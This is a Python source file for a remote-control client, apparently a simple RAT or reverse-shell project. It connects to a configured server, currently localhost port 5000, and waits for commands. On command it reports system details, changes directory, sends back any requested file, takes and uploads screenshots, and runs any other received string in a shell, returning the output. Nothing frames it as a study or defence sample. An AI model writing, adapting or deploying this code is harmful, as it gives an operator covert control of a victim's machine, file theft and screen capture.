from socket import socket, AF_INET, SOCK_STREAM
import subprocess
import platform
import os
from PIL import ImageGrab

HOST = "127.0.0.1" # Server IP
PORT = 5000
class TCPClient:
    
    def __init__(self):
        self.client_socket = socket(AF_INET, SOCK_STREAM)
    
    def start(self):
        self.client_socket.connect((HOST, PORT))
    
    def run(self):
        self.start()
        while True:
            commande_data = self.client_socket.recv(2048)
            if not commande_data:
                break

            commande = commande_data.decode()
            commande_split = commande.split()

            if commande == "infos":
                response = platform.platform() + " " + os.getcwd()
                response = response.encode()
            elif len(commande_split) == 2 and commande_split[0] == "cd":
                try:
                    os.chdir(commande_split[1])
                    response = " "
                except FileNotFoundError:
                    response = "ERROR : This directory doens't exist"
                response = response.encode()

            elif len(commande_split) == 2 and commande_split[0] == "dl":
                try:
                    f = open(commande_split[1], "rb")
                except FileNotFoundError:
                    response = " ".encode()
                else:   
                    response = f.read()
                
            elif len(commande_split) == 2 and commande_split[0] == "capture":
                screenshot = ImageGrab.grab()
                screenshot_filename = commande_split[1] + ".png"
                screenshot.save(screenshot_filename, "PNG")
                try:
                    f = open(screenshot_filename, "rb")
                except FileNotFoundError:
                    response = " ".encode()
                else:
                    response = f.read()
                    f.close()
            
            else:
                resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
                response = resultat.stdout + resultat.stderr
                if not response or len(response) == 0:
                    response = " "
                response = response.encode()

            data_len = len(response)
            header = str(data_len).zfill(13)
            self.client_socket.sendall(header.encode())
            if data_len > 0:
                self.client_socket.sendall(response)
                
        self.client_socket.close()

client = TCPClient()
client.run()